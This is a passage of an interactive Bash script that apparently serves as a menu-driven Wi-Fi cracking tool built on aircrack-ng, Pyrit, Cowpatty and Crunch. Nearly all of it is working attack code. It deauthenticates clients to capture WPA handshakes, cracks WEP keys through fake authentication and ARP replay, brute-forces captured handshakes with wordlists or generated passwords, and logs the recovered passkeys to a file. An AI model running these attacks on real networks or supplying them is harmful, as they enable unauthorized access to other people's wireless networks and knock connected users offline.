AP_essid=`echo "$Chosen_AP_Details" | awk '{ print $11 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`
AP_bssid=`echo "$Chosen_AP_Details" | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`
AP_channel=`echo "$Chosen_AP_Details" | awk '{ print $6 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`

clear
echo $RED"Chosen Target Details."$STAND
echo $RED"Aceess Point essid$STAND: $AP_essid"
echo $RED"Aceess Point bssid$STAND: $AP_bssid"
echo $RED"Aceess Point Channel Number$STAND: $AP_channel"

echo ""
echo $RED"Scan for clients connected to$STAND $AP_essid"
echo $RED"Once you have identified the client you wish to target press Ctrl-C to exit"$STAND
read -p $GREEN"Press [Enter] to start the scan."$STAND

xterm -geometry 100x20+650+0 -l -lf WPA_ClientScan.txt -e airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0

while true
do

tac WPA_ClientScan.txt | grep 'CIPHER' -m 1 -B 9999 | tac | sed -r -e 's/\./ /' | sed '$d' | sed '1,6d' | awk '{ print $2 }' > temp1.txt
cat temp1.txt | nl -ba -w 1  -s ': ' > ConnectedClientsScan.txt
ConnectedClientsScan=$(cat ConnectedClientsScan.txt)

sleep 2
echo ""
echo $RED"Please choose a client MAC address"$STAND
echo ""
echo "$ConnectedClientsScan"
echo ""
read -p $GREEN"Please input the number of your chosen client MAC address:$STAND " Chosen_Client
echo ""

sleep 1
Chosen_Client_MAC=$(cat temp1.txt | sed -n ""$Chosen_Client"p")
echo ""
echo $RED"Chosen Client MAC Address."$STAND
echo "$Chosen_Client_MAC"
echo ""

xterm -geometry 100x20+675+0 -e "airodump-ng -c $AP_channel --ignore-negative-one -w psk --bssid $AP_bssid mon0" &

echo $RED"Choose an option:"
echo $GREEN"[1]$BLUE = De-Authenticate The Chosen Client?."
echo $GREEN"[2]$BLUE = De-Authenticate All Connected Clients?."
echo $GREEN"[3]$BLUE = Choose another client."
echo $GREEN"1, 2, or 3?"$STAND
read option

if [[ $option == "1" ]]; then
       echo "De-Authenticate a single client."
       xterm -geometry 100x20+675+350 -e  "aireplay-ng -0 10 --ignore-negative-one -a $AP_bssid -c $Chosen_Client_MAC mon0"
       fi
if [[ $option == "2" ]]; then
       echo "De-Authenticate all connected clients."
       xterm -geometry 100x20+675+350 -e  "aireplay-ng -0 10 --ignore-negative-one -a $AP_bssid mon0"
       fi
if [[ $option == "3" ]]; then
       clear
echo "Please choose a client"
       echo ""
       echo "$ConnectedClientsScan"
       echo ""
       read -p $GREEN"Please input the number of the chosen client:$STAND " Chosen_Client
       echo ""
       Chosen_Client_MAC=$(cat temp1.txt | sed -n ""$Chosen_Client"p")
       echo ""
       echo "Chosen Target Details."
       echo "$Chosen_Client_MAC"
       sleep 4
       fi

clear
echo -n $GREEN"Re-send de-auth request or choose another client? (y or n)$STAND: "
read -e CONFIRM
case $CONFIRM in
n|N|NO|no|No)
break ;;
*) echo "" ;;
esac
done

rm WPA_Scan.txt
rm temp0.txt
rm PresentedAPs.txt

rm WPA_ClientScan.txt
rm temp1.txt
rm ConnectedClientsScan.txt

kill `pidof airodump-ng`
rm *.csv
rm *.netxml
mv *.cap $opt/wifi/Captured_Handshakes/$AP_essid.cap
cd
;;

###### [5] WEP Attacks ######
5)
cd $opt/wifi/temp
clear
echo $RED"Scan for possible targets."$STAND
echo $GREEN"Once you've identified a target press Ctrl-C to exit the scan and to continue."$STAND
read -p $GREEN"Press [Enter] to start the scan.$STAND"

xterm -geometry 111x35+650+0 -l -lf WEP_Scan.txt -e airodump-ng --encrypt WEP mon0

sleep 1
tac WEP_Scan.txt | grep 'CIPHER' -m 1 -B 9999 | tac | sed -n '/STATION/q;p' | sed '1,2d' | sed '$d' | sed '/<length:  0>/d' > temp0.txt
sleep 1
PresentedAPs=$(cat temp0.txt | awk '{ print $10 }' | nl -ba -w 1  -s ':  ' | sed 's/^[ \t]*//;s/[ \t]*$//' )

clear
echo $RED"Please choose a target"$STAND
echo ""
echo "$PresentedAPs"
echo ""
read -p $GREEN"Please input the number of your chosen target:$STAND " Chosen_AP
echo ""

Chosen_AP_Details=$(cat temp0.txt | sed -n ""$Chosen_AP"p")
AP_essid=`echo "$Chosen_AP_Details" | awk '{ print $10 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`
AP_bssid=`echo "$Chosen_AP_Details" | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`
AP_channel=`echo "$Chosen_AP_Details" | awk '{ print $6 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`

clear
echo $RED"Chosen Target Details."$STAND
echo $RED"Aceess Point essid$STAND: $AP_essid"
echo $RED"Aceess Point bssid$STAND: $AP_bssid"
echo $RED"Aceess Point Channel Number$STAND: $AP_channel"
echo ""
echo $RED"Scan for clients connected to$STAND $AP_essid."
echo $RED"When you've identified a target press Ctrl-C to exit.$STAND"
read -p $GREEN"Press [Enter] to start the scan."$STAND

sleep 1
xterm -geometry 111x35+650+0 -l -lf WEP_ClientScan.txt -e airodump-ng -c $AP_channel --bssid $AP_bssid mon0

echo ""
echo $GREEN"Did the access point have any clients connected to it?. (y/n)$STAND"
read answer

if [[ $answer == "y" || $answer == "Y" ]]; then

       tac WEP_ClientScan.txt | grep 'STATION' -m 1 -B 9999 | tac | awk '{ print $2 }' | sed '1,2d' | sed '$d' > ClientScan.txt
       sleep 2
       PresentedClients=$(cat ClientScan.txt | awk '{ print $1 }' | nl -ba -w 1  -s ':  ' | sed 's/^[ \t]*//;s/[ \t]*$//')
       
       sleep 2
       clear
       echo "Please choose a client"
       echo ""
       echo "$PresentedClients"
       echo ""
       
       read -p $GREEN"Please input the number of your chosen target:$STAND " Chosen_Client
       echo ""

       Chosen_ClientMAC=$(cat ClientScan.txt | sed -n ""$Chosen_Client"p")
       ClientMAC=`echo "$Chosen_AP_Details" | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`

       echo $RED"You've chosen:"
       echo $RED"Client$STAND: $ClientMAC"
       echo ""
       
       while true
       do

       read -p $GREEN"Press [Enter] to start the attack.$STAND"
       xterm -e "airodump-ng -w capture --bssid $AP_bssid -c $AP_channel mon0" &
       xterm -e "sleep 1 && aireplay-ng -1 0 -e $AP_essid -a $AP_bssid -h $ClientMAC --ignore-negative-one mon0" &
       xterm -e "sleep 1 && aireplay-ng -3 -b $AP_bssid -h $ClientMAC --ignore-negative-one mon0" &
       echo $RED"NOTE: There's a 60 second delay before Aircrack-ng starts the cracking process."
       echo "Please wait for aircrack to start...$STAND"
       sleep 60
       aircrack-ng -b $AP_bssid *.cap -l WEPpasskey.txt
       sleep 2
       passkey=$(cat WEPpasskey.txt)
       sleep 2
       kill `pidof xterm`
       echo ""
       echo $RED"Target essid$STAND: $AP_essid"
       echo $RED"Target bssid$STAND: $AP_bssid"
       echo $RED"Target Pass-Key$STAND: $passkey"

       echo -n $GREEN"Was the attack successful? (y or n)$STAND: "
       read -e CONFIRM
       case $CONFIRM in
       y|Y|YES|yes|Yes)
       break ;;
       *) echo $RED"Please re-enter information$STAND" ;;
       esac
       done

       echo AP ESSID: $AP_essid >> $opt/wifi/Recovered-WPA-Passkeys.txt
       echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt
       echo WEP Passkey: $passkey >> $opt/wifi/Recovered-WPA-Passkeys.txt
       echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt
       cd
       fi
if [[ $answer == "n" || $answer == "N" ]]; then
       while true
       do

       echo $RED"Starting packet capture, press Ctrl+c to end it"$STAND
       xterm -geometry 100x20+675+0 -e "airodump-ng -c $AP_channel --bssid $AP_bssid --ivs -w capture mon0" & AIRODUMPPID=$!
       sleep 2
       aireplay-ng -1 0 -a $AP_bssid -h $mon0mac --ignore-negative-one mon0
       sleep 2
       aireplay-ng -5 -b $AP_bssid -h $mon0mac --ignore-negative-one mon0
       sleep 2
       packetforge-ng -0 -a $AP_bssid -h $mon0mac -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet mon0
       sleep 2
       xterm -geometry 100x20+675+100 -e "aireplay-ng -2 -r arp-packet --ignore-negative-one mon0" & AIREPLAYPID=$!
       sleep 2

       echo ""
       echo $GREEN"Attempt to crack the passkey if the data increases, Is the data increasing?. (y/n)$STAND"
       read option
       
       if [[ $option == "y" ]]; then
              aircrack-ng -n 128 -b $AP_bssid *.ivs -l WEPpasskey.txt
              passkey=$(cat WEPpasskey.txt)
              rm WEPpasskey.txt
              kill ${AIRODUMPPID}
              kill ${AIREPLAYPID}
              rm *.ivs
              rm *.cap
              rm *.xor
              rm arp-packet
              echo AP ESSID: $AP_essid >> $opt/wifi/Recovered-WPA-Passkeys.txt
              echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt
              echo WEP Passkey: $passkey >> $opt/wifi/Recovered-WPA-Passkeys.txt
              echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt
              fi

       echo -n $GREEN"Was the attack successful? (y or n)$STAND: "
       read -e CONFIRM
       case $CONFIRM in
       y|Y|YES|yes|Yes)
       break ;;
       *) echo ""
       esac
       done
       fi
       cd
;;

###### [6] Attack Handshake.cap Files ######
6)
clear
echo $RED"###################################"
echo "#                                 #"
echo "#         With a wordlist         #"
echo "# $GREEN[1]$BLUE = Aircrack-ng               $RED#"
echo "# $GREEN[2]$BLUE = Pyrit                     $RED#"
echo "# $GREEN[3]$BLUE = Pyrit + Cowpatty          $RED#"
echo "#                                 #"
echo "#       Without a wordlist        #"
echo "# $GREEN[4]$BLUE = Crunch + Aircrack-ng      $RED#"
echo "# $GREEN[5]$BLUE = Crunch + Pyrit            $RED#"
echo "# $GREEN[6]$BLUE = Crunch + Pyrit + Cowpatty $RED#"
echo "#                                 #"
echo "###################################"
echo
echo $GREEN"Choose an option?"$STAND
read option
if [[ $option == "1" ]]; then
   clear
   echo $RED
   echo "############################################"
   echo "#                                          #"
   echo "#$STAND   Attack Capture File Using A Wordlist   $RED#"
   echo "#$STAND              (Aircrack-ng)               $RED#"
   echo "#                                          #"
   echo "############################################"
   echo
   echo $RED"eg: /root/Desktop/sky12345.cap"
   read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
   echo
   echo $RED"eg: /root/Desktop/wordlist.txt"
   read -p $GREEN"Wordlist location, name, extension$STAND: " WordlistNameLocation
   clear
   # Chosen user input options
   ############################
   echo
   echo $RED"You've chosen:"
   echo "=============="
   echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
   echo $RED"Wordlist location, name, extension$STAND: $WordlistNameLocation"
   echo
   echo $RED"Commands to launch:"
   echo "==================="
   echo $STAND"aircrack-ng -w $WordlistNameLocation $CapNameLocation"
   echo
   # Launch chosen commands/options
   #################################
   read -p $GREEN"Press enter to start"$STAND
   clear
   aircrack-ng -w $WordlistNameLocation $CapNameLocation
   fi
if [[ $option == "2" ]]; then
   clear
   echo $RED
   echo "############################################"
   echo "#                                          #"
   echo "#$STAND   Attack Capture File Using A Wordlist   $RED#"
   echo "#$STAND                 (Pyrit)                  $RED#"
   echo "#                                          #"
   echo "############################################"
echo
echo $RED"eg: 00:11:22:33:44:55"
read -p $GREEN"Access Point bssid$STAND: " bssid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
echo
echo $RED"eg: /root/Desktop/wordlist.txt"
read -p $GREEN"Wordlist location, name, extension$STAND: " WordlistNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Access Point bssid$STAND: $bssid"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"Wordlist location, name, extension$STAND: $WordlistNameLocation"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"pyrit -r $CapNameLocation -i $WordlistNameLocation -b $bssid attack_passthrough"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
pyrit -r $CapNameLocation -i $WordlistNameLocation -b $bssid attack_passthrough
                 fi
                 if [[ $option == "3" ]]; then
                                  clear
echo $RED
echo "############################################################################"
echo "#                                                                          #"
echo "#$STAND                   Attack Capture File Using A Wordlist                   $RED#"
echo "#$STAND                            (Pyrit + Cowpatty)                            $RED#"
echo "#                                                                          #"
echo "############################################################################"$STAND
echo
echo $RED"eg: sky12345"
read -p $GREEN"Access Point essid$STAND: " essid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
echo
echo $RED"eg: /root/Desktop/wordlist.txt"
read -p $GREEN"Wordlist location, name, extension$STAND: " WordlistNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Access Point essid$STAND: $essid"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"Wordlist location, name, extension$STAND: $WordlistNameLocation"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"cat $WordlistNameLocation | pyrit -e $essid -i - -o - passthrough | cowpatty -d - -r $CapNameLocation -s $essid"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
cat $WordlistNameLocation | pyrit -e $essid -i - -o - passthrough | cowpatty -d - -r $CapNameLocation -s $essid
                 fi
                 if [[ $option == "4" ]]; then
                                  lear
echo $RED
echo "############################################################################"
echo "#                                                                          #"
echo "#$STAND           Attack a Capture file without using a wordlist file            $RED#"
echo "#$STAND                          (Crunch + Aircrack-ng)                          $RED#"
echo "#                                                                          #"
echo "############################################################################"$STAND
echo
echo $RED"eg: abcdef23456789"
read -p $GREEN"Input the characters, digits, or symbols to be used$STAND: " CharacterSet
echo
echo $RED"eg: 10"
read -p $GREEN"Input the minimum length of the passwords$STAND: " PasswordLengthMin
echo
echo $RED"eg: 10"
read -p $GREEN"Input the maximum length of the passwords$STAND: " PasswordLengthMax
echo
echo $RED"eg:"
echo $RED"-d <Number> = Limits the amount of times a character, digit, or symbol can appear next to its self."
echo $RED"-s XXXXXXXXXX = Start point."
read -p $GREEN"Input any other optional crunch commands?$STAND: " OptionalCrunchOptions
echo
echo $RED"eg: sky12345"
read -p $GREEN"Access Point essid$STAND: " essid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Minimum length password$STAND: $PasswordLengthMin"
echo $RED"Maximum length of password$STAND: $PasswordLengthMax"
echo $RED"Characters, digits, symbols to be used in the passwords$STAND: $CharacterSet"
echo $RED"Other crunch commands?$STAND: $OptionalCrunchOptions"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"essid$STAND: $essid"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | aircrack-ng $CapNameLocation -e $essid -w -"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | aircrack-ng $CapNameLocation -e $essid -w -
                 fi
                 if [[ $option == "5" ]]; then
                                  clear
echo $RED
echo "############################################################################"
echo "#                                                                          #"
echo "#$STAND           Attack a Capture file without using a wordlist file            $RED#"
echo "#$STAND                             (Crunch + Pyrit)                             $RED#"
echo "#                                                                          #"
echo "############################################################################"$STAND
echo
echo $RED"eg: abcdef23456789"
read -p $GREEN"Input the characters, digits, or symbols to be used$STAND: " CharacterSet
echo
echo $RED"eg: 10"
read -p $GREEN"Input the minimum length of the passwords$STAND: " PasswordLengthMin
echo
echo $RED"eg: 10"
read -p $GREEN"Input the maximum length of the passwords$STAND: " PasswordLengthMax
echo
echo $RED"eg:"
echo $RED"-d <Number> = Limits the amount of times a character, digit, or symbol can appear next to its self."
echo $RED"-s XXXXXXXXXX = Start point."
read -p $GREEN"Input any other optional crunch commands?$STAND: " OptionalCrunchOptions
echo
echo $RED"eg: sky12345"
read -p $GREEN"Access Point essid$STAND: " essid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Minimum length password$STAND: $PasswordLengthMin"
echo $RED"Maximum length of password$STAND: $PasswordLengthMax"
echo $RED"Characters, digits, symbols to be used in the passwords$STAND: $CharacterSet"
echo $RED"Other crunch commands?$STAND: $OptionalCrunchOptions"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"essid$STAND: $essid"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | pyrit -e $essid -r $CapNameLocation -i - attack_passthrough"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | pyrit -e $essid -r $CapNameLocation -i - attack_passthrough
                 fi
                 if [[ $option == "6" ]]; then
                                  clear
echo $RED
echo "############################################################################"
echo "#                                                                          #"
echo "#$STAND           Attack a Capture file without using a wordlist file            $RED#"
echo "#$STAND                       (Crunch + Pyrit + Cowpatty)                        $RED#"
echo "#                                                                          #"
echo "############################################################################"$STAND
echo
echo $RED"eg: abcdef23456789"
read -p $GREEN"Input the characters, digits, or symbols to be used$STAND: " CharacterSet
echo
echo $RED"eg: 10"
read -p $GREEN"Input the minimum length of the passwords$STAND: " PasswordLengthMin
echo
echo $RED"eg: 10"
read -p $GREEN"Input the maximum length of the passwords$STAND: " PasswordLengthMax
echo
echo $RED"eg:"
echo $RED"-d <Number> = Limits the amount of times a character, digit, or symbol can appear next to its self."
echo $RED"-s XXXXXXXXXX = Start point."
read -p $GREEN"Input any other optional crunch commands?$STAND: " OptionalCrunchOptions
echo
echo $RED"eg: sky12345"
read -p $GREEN"Access Point essid$STAND: " essid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Minimum length password$STAND: $PasswordLengthMin"
echo $RED"Maximum length of password$STAND: $PasswordLengthMax"
echo $RED"Characters, digits, symbols to be used in the passwords$STAND: $CharacterSet"
echo $RED"Other crunch commands?$STAND: $OptionalCrunchOptions"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"essid$STAND: $essid"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | pyrit -e $essid -i - -o - passthrough | cowpatty -d - -r $CapNameLocation -s $essid"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | pyrit -e $essid -i - -o - passthrough | cowpatty -d - -r $CapNameLocation -s $essid
fi
;;
7)
###########################
# Show Recovered Passkeys #
###########################
gnome-open $opt/wifi/Recovered-WPA-Passkeys.txt
 ;;
8)
##############################################################################
# Check In Recovered-WPA-Passkeys.txt To See If You Already Have The Passkey #
##############################################################################
###################
# Passkey Checker #
###################
clear
echo $RED"How would you like to search."
echo $GREEN"[1]$BLUE = Search using the bssid."
echo $GREEN"[2]$BLUE = Search using the essid."
echo $GREEN"[0]$BLUE = Return To Previous Menu."
echo $GREEN"1, 2 or 0?"$STAND
read option

if [[ $option == "1" ]]; then
while true
do
   echo -n $GREEN"Please input the bssid of the access point you would like to check for?$STAND: "
   read -e SEARCHbssid
   grep -B 1 -A 2 $SEARCHbssid $opt/wifi/Recovered-WPA-Passkeys.txt
   echo
echo -n "Would you like to search again? (y or n): "
read -e CONFIRM
case $CONFIRM in
n|N|NO|no|No)
break ;;
*) echo ""
esac
done
fi
if [[ $option == "2" ]]; then
while true
do
   echo -n $GREEN"Please input the essid of the access point you would like to check for?$STAND: "
   read -e SEARCHessid
   grep -A 3 $SEARCHessid $opt/wifi/Recovered-WPA-Passkeys.txt
   echo
echo -n "Would you like to search again? (y or n): "
read -e CONFIRM
case $CONFIRM in
n|N|NO|no|No)
break ;;
*) echo ""
esac
done
fi
if [[ $option == "0" ]]; then
echo "Returning To Menu"
fi
 ;;
0) exit 0;;
*) echo "You've chosen an invalid option, please choose again";
echo "Press [Enter] to continue. . ." ; read ;;
esac
 done
exit
